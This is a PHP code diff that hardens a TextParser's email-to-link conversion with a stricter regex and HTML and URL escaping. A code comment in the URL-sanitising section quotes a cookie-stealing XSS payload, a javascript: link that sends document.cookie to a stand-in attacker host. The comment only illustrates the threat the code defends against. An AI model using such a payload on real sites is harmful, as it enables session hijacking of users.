@@ -9,10 +9,20 @@ class TextParser
     public function __invoke(string $text): string
     {
         $text = ltrim($text);
-        $text = preg_replace(
-            '/([\._a-z0-9-]+@[\.a-z0-9-]+)/i',
-            '<a href="mailto:\\1" class="email">\\1</a>',
-            $text,
+        $text = preg_replace_callback(
+            '/\b([a-z0-9](?:[a-z0-9._%+-]{0,62}[a-z0-9])?@' .
+            '(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+' .
+            '[a-z]{2,63})\b/i',
+            static function (array $matches): string {
+                $email = $matches[1];
+
+                $emailEsc = htmlspecialchars($email, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+
+                $mailto = rawurlencode($email);
+
+                return '<a href="mailto:' . $mailto . '" class="email">' . $emailEsc . '</a>';
+            },
+            $text
         );
         $linkPattern = '/(.*)<a.*href\s*=\s*\"(.*?)\"\s*(.*?)>(.*?)<\s*\/a\s*>(.*)/is';
         $link = [];
@@ -21,7 +31,7 @@ class TextParser
             $url = $matches[2];
             $rest = $matches[3];
             if (!preg_match('/^(http:)|(mailto:)|(ftp:)|(https:)/i', $url)) {
-                // avoid this
+                // Removing all colons breaks legitimate URLs but avoids this 🤷
                 //<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie)">
                 $url = preg_replace('/:/', '', $url);
             }
